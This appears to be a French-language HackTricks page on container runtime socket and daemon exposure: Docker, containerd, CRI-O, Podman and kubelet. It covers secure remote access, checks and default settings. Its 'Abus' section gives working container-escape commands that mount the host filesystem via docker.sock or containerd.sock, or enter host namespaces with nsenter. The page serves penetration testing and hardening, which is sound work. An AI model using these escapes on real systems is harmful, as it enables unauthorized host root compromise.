# API runtime et exposition du daemon

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Beaucoup de compromissions réelles de conteneurs ne commencent pas du tout par une évasion de namespace. Elles commencent par l'accès au plan de contrôle du runtime. Si une workload peut parler à `dockerd`, `containerd`, CRI-O, Podman, ou kubelet via un socket Unix monté ou un listener TCP exposé, l'attaquant peut être en mesure de demander un nouveau container avec des privilèges accrus, monter le système de fichiers de l'hôte, rejoindre les namespaces de l'hôte, ou récupérer des informations sensibles sur le nœud. Dans ces cas, l'API runtime est la véritable frontière de sécurité, et la compromettre revient, en pratique, à compromettre l'hôte.

C'est pourquoi l'exposition des sockets runtime doit être documentée séparément des protections du noyau. Un container avec des protections habituelles seccomp, capabilities, and MAC confinement peut néanmoins n'être qu'à un appel API d'une compromission de l'hôte si `/var/run/docker.sock` ou `/run/containerd/containerd.sock` est monté à l'intérieur. L'isolation du noyau du container courant peut fonctionner exactement comme prévu tandis que le plan de gestion du runtime reste entièrement exposé.

## Modèles d'accès au daemon

Docker Engine traditionally exposes its privileged API through the local Unix socket at `unix:///var/run/docker.sock`. Historically it has also been exposed remotely through TCP listeners such as `tcp://0.0.0.0:2375` or a TLS-protected listener on `2376`. Exposing the daemon remotely without strong TLS and client authentication effectively turns the Docker API into a remote root interface.

containerd, CRI-O, Podman, and kubelet expose similar high-impact surfaces. The names and workflows differ, but the logic does not. If the interface lets the caller create workloads, mount host paths, retrieve credentials, or alter running containers, the interface is a privileged management channel and should be treated accordingly.

Common local paths worth checking are:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Les stacks plus anciens ou plus spécialisés peuvent également exposer des points de terminaison tels que `dockershim.sock`, `frakti.sock` ou `rktlet.sock`. Ceux-ci sont moins courants dans les environnements modernes, mais lorsqu'ils sont rencontrés, ils doivent être traités avec la même prudence car ils représentent des surfaces de contrôle du runtime plutôt que de simples sockets d'application.

## Accès distant sécurisé

Si un daemon doit être exposé au-delà du socket local, la connexion doit être protégée par TLS et de préférence par une authentification mutuelle afin que le daemon vérifie le client et que le client vérifie le daemon. L'ancienne habitude d'ouvrir le Docker daemon en HTTP non chiffré par commodité est l'une des erreurs les plus dangereuses en administration de conteneurs, car la surface de l'API est suffisamment puissante pour créer directement des conteneurs privilégiés.

Le schéma de configuration historique de Docker ressemblait à :
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Sur les hôtes basés sur systemd, la communication du daemon peut aussi apparaître comme `fd://`, signifiant que le processus hérite d'un socket pré-ouvert par systemd plutôt que de le bind directement. La leçon importante n'est pas la syntaxe exacte mais la conséquence en matière de sécurité. Dès que le daemon écoute au-delà d'un local socket à permissions strictes, transport security et client authentication deviennent obligatoires plutôt qu'un durcissement optionnel.

## Abus

Si un runtime socket est présent, confirmez lequel il est, si un client compatible existe, et si un accès raw HTTP ou gRPC est possible :
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Ces commandes sont utiles parce qu'elles distinguent entre un chemin mort, un socket monté mais inaccessible, et une API privilégiée active. Si le client réussit, la question suivante est de savoir si l'API peut lancer un nouveau container avec un host bind mount ou host namespace sharing.

### Exemple complet : Docker Socket To Host Root

Si `docker.sock` est accessible, l'évasion classique consiste à démarrer un nouveau container qui monte le système de fichiers racine de l'hôte puis à `chroot` dedans :
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Cela fournit une exécution directe en host-root via le Docker daemon. L'impact ne se limite pas à la lecture de fichiers. Une fois dans le nouveau container, l'attaquant peut modifier des fichiers host, récupérer des credentials, implanter une persistance ou démarrer d'autres workloads privilégiés.

### Exemple complet: Docker Socket To Host Namespaces

Si l'attaquant préfère l'entrée dans les namespaces au lieu d'un accès uniquement au filesystem :
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Ce chemin atteint l'hôte en demandant au runtime de créer un nouveau conteneur avec une exposition explicite du host-namespace plutôt qu'en exploitant celui en cours.

### Exemple complet : containerd Socket

Un socket `containerd` monté est généralement tout aussi dangereux :
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
L'impact est, encore une fois, la compromission de l'hôte. Même si l'outillage spécifique à Docker est absent, une autre runtime API peut néanmoins offrir le même pouvoir d'administration.

## Vérifications

L'objectif de ces vérifications est de déterminer si le conteneur peut atteindre un quelconque plan de gestion qui aurait dû rester en dehors du périmètre de confiance.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Ce qui est intéressant ici :

- Un socket du runtime monté est généralement une primitive administrative directe plutôt qu'une simple divulgation d'information.
- Un écouteur TCP sur `2375` sans TLS doit être considéré comme une condition de compromission à distance.
- Les variables d'environnement telles que `DOCKER_HOST` révèlent souvent que la charge de travail a été intentionnellement conçue pour communiquer avec le runtime de l'hôte.

## Paramètres par défaut du runtime

| Runtime / platform | État par défaut | Comportement par défaut | Faiblesses manuelles courantes |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix local par défaut | `dockerd` écoute sur le socket local et le daemon s'exécute généralement avec les privilèges root | montage de `/var/run/docker.sock`, exposition de `tcp://...:2375`, TLS faible ou absent sur `2376` |
| Podman | CLI sans daemon par défaut | Aucun daemon privilégié persistant n'est requis pour l'utilisation locale ordinaire ; des sockets d'API peuvent quand même être exposés lorsque `podman system service` est activé | exposition de `podman.sock`, exécution trop permissive du service, utilisation de l'API avec privilèges root |
| containerd | Socket local privilégié | API administrative exposée via le socket local et généralement utilisée par des outils de niveau supérieur | montage de `containerd.sock`, accès étendu à `ctr` ou `nerdctl`, exposition de namespaces privilégiés |
| CRI-O | Socket local privilégié | Le endpoint CRI est destiné aux composants de confiance locaux au nœud | montage de `crio.sock`, exposition du endpoint CRI à des workloads non fiables |
| Kubernetes kubelet | API de gestion locale au nœud | Le kubelet ne devrait pas être largement accessible depuis les Pods ; l'accès peut exposer l'état des pods, des credentials, et des fonctionnalités d'exécution selon authn/authz | montage des sockets ou certificats du kubelet, authentification kubelet faible, réseau hôte combiné à un endpoint kubelet accessible |
{{#include ../../../banners/hacktricks-training.md}}
